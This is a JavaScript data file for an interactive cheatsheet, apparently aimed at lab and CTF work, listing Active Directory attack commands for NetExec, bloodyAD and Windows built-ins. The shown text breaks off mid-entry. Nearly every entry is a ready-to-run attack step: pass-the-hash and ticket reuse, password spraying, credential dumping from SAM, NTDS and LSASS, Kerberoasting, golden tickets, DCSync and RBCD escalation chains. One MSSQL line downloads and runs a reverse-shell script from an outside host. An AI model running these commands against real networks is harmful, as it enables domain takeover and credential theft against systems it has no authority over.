/**
 * Interactive Cheatsheet Data
 * Structure: { tool_id: [categories] }
 */
const CHEATSHEET_DATA = {
    nxc: [
        {
            id: "smb",
            title: "SMB",
            icon: "ti-database",
            sections: [
                {
                    title: "Authentication — Password / Hash / Ticket",
                    items: [
                        {
                            label: "Password auth",
                            tag: "basic",
                            tagClass: "tag-green",
                            code: "nxc smb 192.168.1.0/24 -u admin -p 'P@ssw0rd'\nnxc smb dc.lab.local -u administrator -p 'Password123!'",
                            note: ""
                        },
                        {
                            label: "Pass-the-Hash (PTH)",
                            tag: "lateral",
                            tagClass: "tag-red",
                            code: "nxc smb 192.168.1.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'\nnxc smb 192.168.1.50 -u administrator -H ':8846f7eaee8fb117ad06bdd830b7586c'",
                            note: "LM:NT format. LM part can be empty (32 zeros) for modern systems."
                        },
                        {
                            label: "Pass-the-Ticket (PTT) with ccache",
                            tag: "lateral",
                            tagClass: "tag-red",
                            code: "export KRB5CCNAME=/tmp/administrator.ccache\nnxc smb dc.lab.local --use-kcache -u administrator",
                            note: ""
                        },
                        {
                            label: "NULL / Guest session",
                            tag: "recon",
                            tagClass: "tag-amber",
                            code: "nxc smb 192.168.1.50 -u '' -p ''\nnxc smb 192.168.1.50 -u 'Guest' -p ''",
                            note: ""
                        }
                    ]
                },
                {
                    title: "Enumeration",
                    items: [
                        {
                            label: "List shares",
                            tag: "recon",
                            tagClass: "tag-amber",
                            code: "nxc smb 192.168.1.50 -u admin -p 'P@ss' --shares\nnxc smb 192.168.1.50 -u admin -p 'P@ss' --shares --filter-shares READ WRITE",
                            note: ""
                        },
                        {
                            label: "Spider / file search",
                            tag: "recon",
                            tagClass: "tag-amber",
                            code: "nxc smb 192.168.1.50 -u admin -p 'P@ss' -M spider_plus\nnxc smb 192.168.1.50 -u admin -p 'P@ss' -M spider_plus -o DOWNLOAD_FLAG=True\nnxc smb 192.168.1.50 -u admin -p 'P@ss' --spider SYSVOL --pattern '.xml'\nnxc smb 192.168.1.50 -u admin -p 'P@ss' --spider C$ --pattern 'password'",
                            note: ""
                        },
                        {
                            label: "Users / groups / sessions",
                            tag: "recon",
                            tagClass: "tag-amber",
                            code: "nxc smb 192.168.1.50 -u admin -p 'P@ss' --users\nnxc smb 192.168.1.50 -u admin -p 'P@ss' --groups\nnxc smb 192.168.1.50 -u admin -p 'P@ss' --sessions\nnxc smb 192.168.1.50 -u admin -p 'P@ss' --loggedon-users\nnxc smb 192.168.1.50 -u admin -p 'P@ss' --local-groups",
                            note: ""
                        },
                        {
                            label: "Password policy / rid brute",
                            tag: "recon",
                            tagClass: "tag-amber",
                            code: "nxc smb 192.168.1.50 -u admin -p 'P@ss' --pass-pol\nnxc smb 192.168.1.50 -u '' -p '' --rid-brute",
                            note: ""
                        }
                    ]
                },
                {
                    title: "Execution",
                    items: [
                        {
                            label: "Remote command execution",
                            tag: "exec",
                            tagClass: "tag-red",
                            code: "nxc smb 192.168.1.50 -u admin -p 'P@ss' -x 'whoami'\nnxc smb 192.168.1.50 -u admin -p 'P@ss' -x 'net user' --exec-method smbexec\nnxc smb 192.168.1.50 -u admin -p 'P@ss' -X 'Get-Process' --exec-method wmiexec\nnxc smb 192.168.1.50 -u admin -p 'P@ss' -x 'whoami /all' --exec-method atexec",
                            note: "-x = cmd.exe shell · -X = PowerShell · exec methods: wmiexec (default), smbexec, atexec, mmcexec"
                        },
                        {
                            label: "Put / get files",
                            tag: "exec",
                            tagClass: "tag-red",
                            code: "nxc smb 192.168.1.50 -u admin -p 'P@ss' --put-file /tmp/shell.exe 'C:\\Windows\\Temp\\shell.exe'\nnxc smb 192.168.1.50 -u admin -p 'P@ss' --get-file 'C:\\Users\\admin\\Desktop\\flag.txt' /tmp/flag.txt",
                            note: ""
                        }
                    ]
                },
                {
                    title: "Dumping Credentials",
                    items: [
                        {
                            label: "SAM / LSA / NTDS.DIT",
                            tag: "creds",
                            tagClass: "tag-red",
                            code: "nxc smb 192.168.1.50 -u admin -p 'P@ss' --sam\nnxc smb 192.168.1.50 -u admin -p 'P@ss' --lsa\nnxc smb 192.168.1.50 -u admin -p 'P@ss' --ntds\nnxc smb 192.168.1.50 -u admin -p 'P@ss' --ntds --user krbtgt",
                            note: "--ntds requires Domain Admin. Uses VSS or drsuapi method automatically."
                        },
                        {
                            label: "LAPS passwords",
                            tag: "creds",
                            tagClass: "tag-red",
                            code: "nxc smb 192.168.1.50 -u admin -p 'P@ss' -M laps\nnxc smb 192.168.1.0/24 -u admin -p 'P@ss' -M laps -o COMPUTER=WS01",
                            note: ""
                        },
                        {
                            label: "Spray (avoid lockout)",
                            tag: "spray",
                            tagClass: "tag-amber",
                            code: "nxc smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success\nnxc smb 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success",
                            note: "--no-bruteforce = tries user[0]:pass[0], user[1]:pass[1] (1:1 pairing). Check --pass-pol first!"
                        }
                    ]
                }
            ]
        },
        {
            id: "ldap",
            title: "LDAP",
            icon: "ti-server",
            sections: [
                {
                    title: "Domain Enumeration",
                    items: [
                        {
                            label: "Basic domain info",
                            tag: "recon",
                            tagClass: "tag-amber",
                            code: "nxc ldap dc.lab.local -u admin -p 'P@ss' --get-dn\nnxc ldap dc.lab.local -u admin -p 'P@ss' -M get-desc-users\nnxc ldap dc.lab.local -u admin -p 'P@ss' --trusted-for-delegation",
                            note: ""
                        },
                        {
                            label: "Users / computers / groups",
                            tag: "recon",
                            tagClass: "tag-amber",
                            code: "nxc ldap dc.lab.local -u admin -p 'P@ss' --users\nnxc ldap dc.lab.local -u admin -p 'P@ss' --computers\nnxc ldap dc.lab.local -u admin -p 'P@ss' --groups\nnxc ldap dc.lab.local -u admin -p 'P@ss' --admin-count",
                            note: "--admin-count lists users with adminCount=1 attribute (privileged accounts)."
                        },
                        {
                            label: "Password policy / ASREPRoast targets",
                            tag: "recon",
                            tagClass: "tag-amber",
                            code: "nxc ldap dc.lab.local -u admin -p 'P@ss' --pass-pol\nnxc ldap dc.lab.local -u admin -p 'P@ss' --asreproast output.txt\nnxc ldap dc.lab.local -u '' -p '' --asreproast output.txt",
                            note: "ASREPRoast works without credentials if pre-auth is disabled for any user."
                        }
                    ]
                },
                {
                    title: "Kerberoasting via LDAP",
                    items: [
                        {
                            label: "Kerberoast all SPNs",
                            tag: "creds",
                            tagClass: "tag-red",
                            code: "nxc ldap dc.lab.local -u admin -p 'P@ss' --kerberoasting output.txt\nnxc ldap dc.lab.local -u admin -H ':HASH' --kerberoasting output.txt",
                            note: "Crack with: hashcat -m 13100 output.txt wordlist.txt"
                        }
                    ]
                },
                {
                    title: "BloodHound Data Collection",
                    items: [
                        {
                            label: "Collect BloodHound data",
                            tag: "bh",
                            tagClass: "tag-purple",
                            code: "nxc ldap dc.lab.local -u admin -p 'P@ss' --bloodhound -ns 192.168.1.10 -c All\nnxc ldap dc.lab.local -u admin -p 'P@ss' --bloodhound -c DCOnly\nnxc ldap dc.lab.local -u admin -p 'P@ss' --bloodhound -c Group,LocalAdmin,Session,Trusts",
                            note: "Output ZIP goes to current dir. Import directly to BH CE or legacy."
                        }
                    ]
                },
                {
                    title: "LDAP Modules",
                    items: [
                        {
                            label: "Useful LDAP modules",
                            tag: "modules",
                            tagClass: "tag-blue",
                            code: "nxc ldap dc.lab.local -u admin -p 'P@ss' -M laps\nnxc ldap dc.lab.local -u admin -p 'P@ss' -M ldap-checker\nnxc ldap dc.lab.local -u admin -p 'P@ss' -M whoami\nnxc ldap dc.lab.local -u admin -p 'P@ss' -M get-network -o ALL=true\nnxc ldap dc.lab.local -u admin -p 'P@ss' -M adcs\nnxc ldap dc.lab.local -u admin -p 'P@ss' -M maq",
                            note: "maq = machine account quota · adcs = lists CA servers and templates"
                        }
                    ]
                }
            ]
        },
        {
            id: "winrm",
            title: "WinRM / RDP",
            icon: "ti-brand-windows",
            sections: [
                {
                    title: "WinRM (port 5985/5986)",
                    items: [
                        {
                            label: "Auth check + shell",
                            tag: "basic",
                            tagClass: "tag-green",
                            code: "nxc winrm 192.168.1.50 -u admin -p 'P@ss'\nnxc winrm 192.168.1.50 -u admin -p 'P@ss' -x 'whoami'\nnxc winrm 192.168.1.50 -u admin -p 'P@ss' -X 'Get-ADUser -Filter *'",
                            note: ""
                        },
                        {
                            label: "Pass-the-Hash over WinRM",
                            tag: "lateral",
                            tagClass: "tag-red",
                            code: "nxc winrm 192.168.1.50 -u admin -H ':8846f7eaee8fb117ad06bdd830b7586c'",
                            note: ""
                        },
                        {
                            label: "Interactive shell (evil-winrm equivalent)",
                            tag: "shell",
                            tagClass: "tag-red",
                            code: "nxc winrm 192.168.1.50 -u admin -p 'P@ss' --no-output\nevil-winrm -i 192.168.1.50 -u admin -p 'P@ss'",
                            note: "nxc winrm is great for spray/check. For interactive PS session, prefer evil-winrm."
                        },
                        {
                            label: "Spray subnet",
                            tag: "spray",
                            tagClass: "tag-amber",
                            code: "nxc winrm 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success",
                            note: ""
                        }
                    ]
                },
                {
                    title: "RDP (port 3389)",
                    items: [
                        {
                            label: "Check access + spray",
                            tag: "recon",
                            tagClass: "tag-amber",
                            code: "nxc rdp 192.168.1.50 -u admin -p 'P@ss'\nnxc rdp 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success\nnxc rdp 192.168.1.50 -u admin -H ':HASH' --nla",
                            note: "nxc rdp only checks auth — use xfreerdp/remmina for interactive sessions."
                        },
                        {
                            label: "Screenshot via RDP",
                            tag: "recon",
                            tagClass: "tag-amber",
                            code: "nxc rdp 192.168.1.50 -u admin -p 'P@ss' --screenshot --screentime 2",
                            note: ""
                        }
                    ]
                }
            ]
        },
        {
            id: "mssql",
            title: "MSSQL",
            icon: "ti-database-sql",
            sections: [
                {
                    title: "Authentication",
                    items: [
                        {
                            label: "SQL / Windows auth",
                            tag: "basic",
                            tagClass: "tag-green",
                            code: "nxc mssql 192.168.1.50 -u sa -p 'P@ss' --local-auth\nnxc mssql 192.168.1.50 -u 'LAB\\sqlsvc' -p 'P@ss'\nnxc mssql 192.168.1.50 -u sa -p 'P@ss' -d MASTER",
                            note: ""
                        }
                    ]
                },
                {
                    title: "Enumeration",
                    items: [
                        {
                            label: "List databases + query",
                            tag: "recon",
                            tagClass: "tag-amber",
                            code: "nxc mssql 192.168.1.50 -u sa -p 'P@ss' -q 'SELECT name FROM sys.databases'\nnxc mssql 192.168.1.50 -u sa -p 'P@ss' -q 'SELECT name,is_sysadmin FROM sys.sql_logins'\nnxc mssql 192.168.1.50 -u sa -p 'P@ss' --local-auth -q 'SELECT SYSTEM_USER, USER_NAME()'",
                            note: ""
                        }
                    ]
                },
                {
                    title: "Command Execution",
                    items: [
                        {
                            label: "xp_cmdshell exec",
                            tag: "exec",
                            tagClass: "tag-red",
                            code: "nxc mssql 192.168.1.50 -u sa -p 'P@ss' -x 'whoami'\nnxc mssql 192.168.1.50 -u sa -p 'P@ss' -x 'powershell -c \"IEX(New-Object Net.WebClient).DownloadString(\\\"http://10.10.14.1/rev.ps1\\\")\"'",
                            note: "nxc auto-enables xp_cmdshell if SA or sysadmin. Re-disables after (optional)."
                        },
                        {
                            label: "File read/write via MSSQL",
                            tag: "exec",
                            tagClass: "tag-red",
                            code: "nxc mssql 192.168.1.50 -u sa -p 'P@ss' --put-file /tmp/shell.exe 'C:\\Windows\\Temp\\shell.exe'\nnxc mssql 192.168.1.50 -u sa -p 'P@ss' --get-file 'C:\\Users\\Administrator\\Desktop\\root.txt' /tmp/root.txt",
                            note: ""
                        }
                    ]
                },
                {
                    title: "Linked Server Abuse",
                    items: [
                        {
                            label: "Enumerate + exec on linked servers",
                            tag: "lateral",
                            tagClass: "tag-red",
                            code: "nxc mssql 192.168.1.50 -u sa -p 'P@ss' -M mssql_priv\nnxc mssql 192.168.1.50 -u sa -p 'P@ss' -q 'SELECT * FROM sys.servers'\nnxc mssql 192.168.1.50 -u sa -p 'P@ss' -q \"SELECT * FROM OPENQUERY([LINKED_SRV],'SELECT SYSTEM_USER')\"",
                            note: "mssql_priv module checks for privesc paths (sysadmin via impersonation, linked servers)."
                        }
                    ]
                }
            ]
        },
        {
            id: "kerb",
            title: "Kerberos",
            icon: "ti-key",
            sections: [
                {
                    title: "Setup",
                    items: [
                        {
                            label: "Kerberos config (critical)",
                            tag: "setup",
                            tagClass: "tag-gray",
                            code: "# /etc/krb5.conf\n[libdefaults]\n    default_realm = LAB.LOCAL\n    dns_lookup_realm = false\n    dns_lookup_kdc = false\n\n[realms]\n    LAB.LOCAL = {\n        kdc = dc.lab.local\n        admin_server = dc.lab.local\n    }\n\n[domain_realm]\n    .lab.local = LAB.LOCAL\n    lab.local = LAB.LOCAL",
                            note: "Hostname resolution must work — add dc.lab.local to /etc/hosts if needed."
                        }
                    ]
                },
                {
                    title: "ASREPRoasting",
                    items: [
                        {
                            label: "ASREPRoast → crack",
                            tag: "creds",
                            tagClass: "tag-red",
                            code: "nxc ldap dc.lab.local -u '' -p '' --asreproast hashes.txt\nnxc ldap dc.lab.local -u users.txt -p '' --asreproast hashes.txt --kdcHost dc.lab.local\nhashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt",
                            note: ""
                        }
                    ]
                },
                {
                    title: "Kerberoasting",
                    items: [
                        {
                            label: "Kerberoast → crack",
                            tag: "creds",
                            tagClass: "tag-red",
                            code: "nxc ldap dc.lab.local -u admin -p 'P@ss' --kerberoasting hashes.txt\nnxc ldap dc.lab.local -u admin -H ':HASH' --kerberoasting hashes.txt --kdcHost dc.lab.local\nhashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt",
                            note: ""
                        }
                    ]
                },
                {
                    title: "Using Tickets (ccache / kirbi)",
                    items: [
                        {
                            label: "PTT with ccache file",
                            tag: "lateral",
                            tagClass: "tag-red",
                            code: "export KRB5CCNAME=/tmp/admin.ccache\nnxc smb dc.lab.local -u admin --use-kcache\nnxc ldap dc.lab.local -u admin --use-kcache --bloodhound -c All\n\n# Convert kirbi → ccache if needed (impacket)\nticketConverter.py admin.kirbi admin.ccache",
                            note: ""
                        },
                        {
                            label: "Golden / Silver ticket (via impacket) + nxc",
                            tag: "persist",
                            tagClass: "tag-red",
                            code: "# Golden ticket\nticketer.py -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-... -domain lab.local administrator\nexport KRB5CCNAME=administrator.ccache\nnxc smb 192.168.1.0/24 -u administrator --use-kcache --exec-method wmiexec -x 'whoami'",
                            note: ""
                        }
                    ]
                }
            ]
        },
        {
            id: "modules",
            title: "Modules",
            icon: "ti-package",
            sections: [
                {
                    title: "Most Useful Modules",
                    items: [
                        {
                            label: "List all available modules",
                            tag: "meta",
                            tagClass: "tag-gray",
                            code: "nxc smb -L\nnxc ldap -L\nnxc mssql -L\nnxc -L   # all protocols",
                            note: ""
                        },
                        {
                            label: "spider_plus — deep file enumeration",
                            tag: "recon",
                            tagClass: "tag-amber",
                            code: "nxc smb 192.168.1.50 -u admin -p 'P@ss' -M spider_plus\nnxc smb 192.168.1.50 -u admin -p 'P@ss' -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=5000000\nnxc smb 192.168.1.50 -u admin -p 'P@ss' -M spider_plus -o EXCLUDE_FILTER='.dll,.exe'",
                            note: "Output JSON saved to /tmp/nxc_spider_plus/. DOWNLOAD_FLAG downloads all readable files."
                        },
                        {
                            label: "gpp_password — SYSVOL GPP creds",
                            tag: "creds",
                            tagClass: "tag-red",
                            code: "nxc smb 192.168.1.50 -u admin -p 'P@ss' -M gpp_password\nnxc smb 192.168.1.50 -u admin -p 'P@ss' -M gpp_autologin",
                            note: "Finds cPassword in Groups.xml / Services.xml etc. Still hits in old environments."
                        },
                        {
                            label: "lsassy — LSASS dump in-memory",
                            tag: "creds",
                            tagClass: "tag-red",
                            code: "nxc smb 192.168.1.50 -u admin -p 'P@ss' -M lsassy\nnxc smb 192.168.1.50 -u admin -H ':HASH' -M lsassy\nnxc smb 192.168.1.50 -u admin -p 'P@ss' -M lsassy -o METHOD=comsvcs",
                            note: ""
                        },
                        {
                            label: "nanodump — stealthy LSASS dump",
                            tag: "creds",
                            tagClass: "tag-red",
                            code: "nxc smb 192.168.1.50 -u admin -p 'P@ss' -M nanodump",
                            note: ""
                        },
                        {
                            label: "mimikatz — classic creds",
                            tag: "creds",
                            tagClass: "tag-red",
                            code: "nxc smb 192.168.1.50 -u admin -p 'P@ss' -M mimikatz\nnxc smb 192.168.1.50 -u admin -p 'P@ss' -M mimikatz -o COMMAND='\"sekurlsa::wdigest\"'",
                            note: ""
                        },
                        {
                            label: "printnightmare / smbghost — vuln check",
                            tag: "vuln",
                            tagClass: "tag-red",
                            code: "nxc smb 192.168.1.0/24 -u admin -p 'P@ss' -M printnightmare\nnxc smb 192.168.1.0/24 -u '' -p '' -M smbghost",
                            note: ""
                        },
                        {
                            label: "petitpotam / dfscoerce / coerce_plus — coercion",
                            tag: "coerce",
                            tagClass: "tag-red",
                            code: "nxc smb 192.168.1.50 -u admin -p 'P@ss' -M petitpotam -o LISTENER=10.10.14.1\nnxc smb 192.168.1.50 -u admin -p 'P@ss' -M dfscoerce -o LISTENER=10.10.14.1",
                            note: "Capture NetNTLM with Responder running on LISTENER. Relay with ntlmrelayx."
                        },
                        {
                            label: "zerologon / nopac — critical vulns",
                            tag: "vuln",
                            tagClass: "tag-red",
                            code: "nxc smb 192.168.1.50 -u '' -p '' -M zerologon\nnxc smb dc.lab.local -u admin -p 'P@ss' -M nopac",
                            note: ""
                        },
                        {
                            label: "Module help",
                            tag: "meta",
                            tagClass: "tag-gray",
                            code: "nxc smb -M lsassy --options",
                            note: ""
                        }
                    ]
                }
            ]
        }
    ],
    bloodyad: [
        {
            id: "auth",
            title: "Auth",
            icon: "ti-droplet",
            sections: [
                {
                    title: "Setup & Install",
                    items: [
                        {
                            label: "Install bloodyAD",
                            tag: "SETUP",
                            tagClass: "tag-gray",
                            code: "pip install bloodyAD --break-system-packages\n# or\ngit clone https://github.com/CravateRouge/bloodyAD && pip install .",
                            note: "Install via pip or from source for the latest features."
                        }
                    ]
                },
                {
                    title: "Authentication Modes",
                    items: [
                        {
                            label: "LDAP Password",
                            tag: "AUTH",
                            tagClass: "tag-blue",
                            code: "bloodyAD --host <DC_IP> -d <DOMAIN> -u <user> -p <password> <COMMAND>",
                            note: "Base syntax for standard LDAP authentication."
                        },
                        {
                            label: "Pass-The-Hash",
                            tag: "PTH",
                            tagClass: "tag-red",
                            code: "bloodyAD --host <DC_IP> -d <DOMAIN> -u <user> -p :<NThash> <COMMAND>\nbloodyAD --host <DC_IP> -d <DOMAIN> -u <user> -p aad3b435b51404eeaad3b435b51404ee:<NThash> <COMMAND>",
                            note: "Authenticates using NT hash instead of password."
                        },
                        {
                            label: "Kerberos (CCache)",
                            tag: "KRB",
                            tagClass: "tag-purple",
                            code: "export KRB5CCNAME=$(pwd)/ticket.ccache\nbloodyAD --host <DC_IP> -d <DOMAIN> -u <user> -k <COMMAND>",
                            note: "Uses Kerberos ticket for authentication."
                        },
                        {
                            label: "Secure LDAPS / AES",
                            tag: "SECURE",
                            tagClass: "tag-green",
                            code: "bloodyAD --host <DC_IP> -d <DOMAIN> -u <user> -p <pass> --dc-ip <DC_IP> -s <COMMAND>\nbloodyAD --host <DC_IP> -d <DOMAIN> -u <user> -p <aes_key> -f aes256 <COMMAND>",
                            note: "Uses LDAPS (636) or AES key for authentication."
                        }
                    ]
                }
            ]
        },
        {
            id: "recon",
            title: "Recon",
            icon: "ti-search",
            sections: [
                {
                    title: "Enumeration",
                    items: [
                        {
                            label: "Get Object Info",
                            tag: "INFO",
                            tagClass: "tag-blue",
                            code: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object $TARGET\nbloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object $TARGET --attr <attribute>",
                            note: "Examples: administrator, DC01$, or attributes like memberOf, msDS-AllowedToDelegateTo, etc."
                        },
                        {
                            label: "List Writable Attributes",
                            tag: "RECON",
                            tagClass: "tag-amber",
                            code: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get writable --detail\nbloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get writable --include-del",
                            note: "Find which attributes current user can write on AD objects. --include-del finds tombstoned objects."
                        },
                        {
                            label: "Machine Account Quota",
                            tag: "ENUM",
                            tagClass: "tag-gray",
                            code: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object \"DC=$DOMAIN_FIRST,DC=$DOMAIN_TLD\" --attr ms-DS-MachineAccountQuota",
                            note: "Checks quota for joining computers to domain (Default 10)."
                        },
                        {
                            label: "BloodHound Collection",
                            tag: "BH",
                            tagClass: "tag-purple",
                            code: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get bloodhound",
                            note: "Dumps AD data in BloodHound JSON format."
                        }
                    ]
                },
                {
                    title: "Custom Search",
                    items: [
                        {
                            label: "LDAP Search Filters",
                            tag: "LDAP",
                            tagClass: "tag-blue",
                            code: "bloodyAD ... get search --filter '(objectClass=computer)' --attr dNSHostName,operatingSystem\nbloodyAD ... get search --filter '(msDS-AllowedToDelegateTo=*)' --attr sAMAccountName\nbloodyAD ... get search --filter '(adminCount=1)' --attr sAMAccountName,memberOf",
                            note: "Perform custom LDAP queries."
                        },
                        {
                            label: "Find ASREProastable / Unconstrained",
                            tag: "LDAP",
                            tagClass: "tag-red",
                            code: "bloodyAD ... get search --filter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' --attr sAMAccountName\nbloodyAD ... get search --filter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' --attr sAMAccountName",
                            note: "Search for DONT_REQ_PREAUTH (ASREProast) or TRUSTED_FOR_DELEGATION (Unconstrained)."
                        },
                        {
                            label: "Read gMSA Raw Blob",
                            tag: "CREDS",
                            tagClass: "tag-red",
                            code: "bloodyAD ... get search --filter '(sAMAccountName=<gMSA_account>$)' --attr 'msDS-ManagedPassword,msDS-ManagedPasswordId,sAMAccountName' --raw",
                            note: "Extract raw gMSA password blob for manual extraction."
                        }
                    ]
                }
            ]
        },
        {
            id: "management",
            title: "Management",
            icon: "ti-settings",
            sections: [
                {
                    title: "User / Account Management",
                    items: [
                        {
                            label: "Enable / Disable Account",
                            tag: "UAC",
                            tagClass: "tag-amber",
                            code: "bloodyAD ... remove uac $TARGET_USER -f ACCOUNTDISABLE\nbloodyAD ... add uac $TARGET_USER -f ACCOUNTDISABLE",
                            note: "Enable or disable accounts via UAC flags."
                        },
                        {
                            label: "Unlock / Password Expiry",
                            tag: "UAC",
                            tagClass: "tag-amber",
                            code: "bloodyAD ... remove uac $TARGET_USER -f LOCKOUT\nbloodyAD ... add uac $TARGET_USER -f DONT_EXPIRE_PASSWORD",
                            note: "Unlock account or set password to never expire."
                        },
                        {
                            label: "Attribute Manipulation",
                            tag: "SET",
                            tagClass: "tag-purple",
                            code: "bloodyAD ... set object $TARGET userPrincipalName -v 'administrator@<DOMAIN>'\nbloodyAD ... set object $TARGET mail -v 'attacker@<DOMAIN>'\nbloodyAD ... set object $TARGET altSecurityIdentities -v 'X509:<RFC822>attacker@<DOMAIN>'",
                            note: "Modify UPN (ESC attacks), Email, or AltSecIDs (ESC14)."
                        }
                    ]
                },
                {
                    title: "Group Manipulation",
                    items: [
                        {
                            label: "Add / Remove Group Member",
                            tag: "GROUP",
                            tagClass: "tag-blue",
                            code: "bloodyAD ... add groupMember '<GROUP_NAME>' '<user_to_add>'\nbloodyAD ... remove groupMember '<GROUP_NAME>' '<user_to_remove>'",
                            note: "Add/Remove users or computers from groups (e.g., Domain Admins)."
                        },
                        {
                            label: "Change Group Type",
                            tag: "GROUP",
                            tagClass: "tag-amber",
                            code: "bloodyAD ... set object $GROUP groupType -v -2147483644",
                            note: "Change group type to Domain Local."
                        }
                    ]
                }
            ]
        },
        {
            id: "abuse",
            title: "Abuse",
            icon: "ti-bolt",
            sections: [
                {
                    title: "ACL & DACL Abuse",
                    items: [
                        {
                            label: "Grant DCSync / GenericAll",
                            tag: "ACL",
                            tagClass: "tag-red",
                            code: "bloodyAD ... add dcsync '<controlled_user>'\nbloodyAD ... add genericAll '<OBJECT_DN>' '<controlled_user>'",
                            note: "Grant DCSync rights or GenericAll on target object/domain."
                        },
                        {
                            label: "Take Ownership (WriteOwner)",
                            tag: "ACL",
                            tagClass: "tag-amber",
                            code: "bloodyAD ... set owner '<TARGET_OBJECT>' '<controlled_user>'",
                            note: "Step 1 of WriteDACL abuse: Take ownership -> Add GenericAll -> Success."
                        }
                    ]
                },
                {
                    title: "Complex Abuses",
                    items: [
                        {
                            label: "Shadow Credentials",
                            tag: "SHADOW",
                            tagClass: "tag-red",
                            code: "bloodyAD ... add shadowCredentials $TARGET\n# Remove\nbloodyAD ... remove shadowCredentials $TARGET --key-id <KEY_ID>",
                            note: "Creates msDS-KeyCredentialLink. Use output hash or .pfx for TGT fetch."
                        },
                        {
                            label: "Targeted Kerberoasting",
                            tag: "KERBEROAST",
                            tagClass: "tag-red",
                            code: "bloodyAD ... set object $TARGET servicePrincipalName -v 'fake/roast.<DOMAIN>'\n# Cleanup\nbloodyAD ... set object $TARGET servicePrincipalName -v ''",
                            note: "Set fake SPN to make user roastable, then use GetUserSPNs.py."
                        },
                        {
                            label: "Delegation (UAC & RBCD)",
                            tag: "DELEGATION",
                            tagClass: "tag-red",
                            code: "bloodyAD ... add uac $TARGET_USER -f TRUSTED_TO_AUTH_FOR_DELEGATION\nbloodyAD ... add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'",
                            note: "Set Protocol Transition, Unconstrained Delegation, or RBCD."
                        }
                    ]
                },
                {
                    title: "Advanced Exploits",
                    items: [
                        {
                            label: "Add Computer Account",
                            tag: "MAQ",
                            tagClass: "tag-blue",
                            code: "bloodyAD ... add computer 'evil$' 'EvilP@ss123!'",
                            note: "Add a new machine account if MachineAccountQuota > 0."
                        },
                        {
                            label: "DNS Record / Logon Script",
                            tag: "ADDO",
                            tagClass: "tag-amber",
                            code: "bloodyAD ... add dnsRecord 'fake' <ATTACKER_IP>\nbloodyAD ... set object $TARGET scriptPath -v '\\\\<IP>\\SHARE\\evil.ps1'",
                            note: "Add DNS A records or set user logon scripts (GenericWrite required)."
                        },
                        {
                            label: "LAPS / gMSA Passwords",
                            tag: "CREDS",
                            tagClass: "tag-red",
                            code: "bloodyAD ... get object '<COMPUTER>$' --attr ms-Mcs-AdmPwd\nbloodyAD ... get object '<gMSA_account>$' --attr msDS-ManagedPassword",
                            note: "Read LAPS or gMSA cleartext passwords."
                        }
                    ]
                }
            ]
        },
        {
            id: "chains",
            title: "Chains",
            icon: "ti-link",
            sections: [
                {
                    title: "Quick Escalation Flows",
                    items: [
                        {
                            label: "WriteDACL Domain -> DCSync",
                            tag: "CHAIN",
                            tagClass: "tag-red",
                            code: "bloodyAD ... add dcsync '<controlled_user>'\npython3 secretsdump.py '<DOMAIN>/<user>:<pass>'@<DC_IP>",
                            note: "Direct path to domain admin via DCSync rights."
                        },
                        {
                            label: "MAQ -> RBCD -> Impersonate DA",
                            tag: "CHAIN",
                            tagClass: "tag-red",
                            code: "bloodyAD ... add computer 'evil$' 'P@ss123!'\nbloodyAD ... add rbcd '<TARGET_HOST>$' 'evil$'\npython3 getST.py '<DOMAIN>/evil$:P@ss123!' -spn 'cifs/<FQDN>' -impersonate Administrator",
                            note: "Full chain from machine account creation to DA impersonation."
                        },
                        {
                            label: "Tombstoned Object Recovery",
                            tag: "RECOVER",
                            tagClass: "tag-amber",
                            code: "bloodyAD ... -k get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065\nbloodyAD ... -k set restore $TARGET_USER",
                            note: "Find and restore deleted AD objects."
                        }
                    ]
                }
            ]
        }
    ],
    windowsad: [
        {
            id: "basic-enum",
            title: "Basic Enum",
            icon: "ti-brand-windows",
            sections: [
                {
                    title: "Host & Domain Context",
                    items: [
                        {
                            label: "Current user context",
                            tag: "ENUM",
                            tagClass: "tag-blue",
                            code: "whoami\nwhoami /all\nwhoami /groups\nwhoami /priv",
                            note: "Shows current identity, groups, privileges, and token context."
                        },
                        {
                            label: "Machine and network info",
                            tag: "ENUM",
                            tagClass: "tag-blue",
                            code: "hostname\nipconfig /all\nroute print\nnet config workstation\nsysteminfo | findstr /B /C:\"Host Name\" /C:\"Domain\" /C:\"OS Name\" /C:\"OS Version\"",
                            note: "Quickly fingerprint host, DNS, domain membership, routes, and OS."
                        },
                        {
                            label: "Domain controller discovery",
                            tag: "DOMAIN",
                            tagClass: "tag-amber",
                            code: "echo %USERDNSDOMAIN%\necho %LOGONSERVER%\nnltest /dclist:<DOMAIN>\nnltest /dsgetdc:<DOMAIN>\nnslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>",
                            note: "Find domain name, logon server, and reachable domain controllers."
                        },
                        {
                            label: "Kerberos cache and sessions",
                            tag: "KRB",
                            tagClass: "tag-purple",
                            code: "klist\nklist sessions\nklist tgt\ncmdkey /list",
                            note: "Lists cached Kerberos tickets and stored Windows credentials."
                        }
                    ]
                },
                {
                    title: "Built-in AD Enumeration",
                    items: [
                        {
                            label: "Domain users and groups",
                            tag: "ENUM",
                            tagClass: "tag-blue",
                            code: "net user /domain\nnet user <TARGET_USER> /domain\nnet group /domain\nnet group \"Domain Admins\" /domain\nnet group \"Enterprise Admins\" /domain",
                            note: "Enumerates domain users, groups, and high-value memberships without extra tools."
                        },
                        {
                            label: "Computers, shares, and sessions",
                            tag: "ENUM",
                            tagClass: "tag-blue",
